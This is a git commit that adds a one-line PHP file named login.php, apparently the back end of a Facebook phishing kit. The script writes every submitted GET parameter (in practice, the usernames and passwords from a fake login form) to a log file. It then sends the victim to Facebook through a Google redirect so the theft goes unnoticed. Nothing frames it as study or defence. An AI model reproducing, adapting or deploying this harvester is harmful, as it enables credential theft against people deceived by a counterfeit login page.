8d35af010cedd6a3af976187bc07e829584f4746
ravi19960826 <39168868+ravi19960826@users.noreply.github.com>
2018-05-11 12:25:09 +0530

    Add files via upload

---
+++ login.php
@@ -0,0 +1,1 @@
+<?php header ('Location: http://www.google.com/search?btnI&q=allinurl:http://www.facebook.com/'); $handle = fopen("log.txt", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; ?>
